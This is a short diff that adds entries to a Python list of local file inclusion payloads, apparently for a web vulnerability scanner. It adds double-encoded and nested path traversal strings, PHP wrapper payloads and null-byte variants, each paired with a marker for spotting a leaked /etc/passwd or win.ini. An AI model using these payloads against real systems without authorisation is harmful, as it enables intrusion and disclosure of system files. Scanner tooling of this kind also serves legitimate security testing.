@@ -34,6 +34,21 @@ LFI_PAYLOADS = [
     ("php://filter/convert.base64-encode/resource=/etc/passwd", "cm9vd"),
     ("php://filter/convert.base64-encode/resource=index.php", "PD9w"),
     ("expect://id", "uid="),
+    # Double-encoding bypass
+    ("..%252f..%252f..%252fetc%252fpasswd", "root:"),
+    ("..%255c..%255c..%255cwindows%255cwin.ini", "[fonts]"),
+    # Nested traversal
+    ("....//....//....//....//etc/passwd", "root:"),
+    # URL-encoded dot-dot
+    ("%2e%2e/%2e%2e/%2e%2e/etc/passwd", "root:"),
+    # PHP wrappers
+    ("php://filter/convert.base64-encode/resource=/etc/hostname", "base64"),
+    ("php://input", "POST_BODY"),
+    # Java/Windows
+    ("..\\..\\..\\..\\windows\\win.ini", "[fonts]"),
+    # Null byte variations
+    ("/etc/passwd%00.html", "root:"),
+    ("/etc/passwd%00.png", "root:"),
 ]
 
 
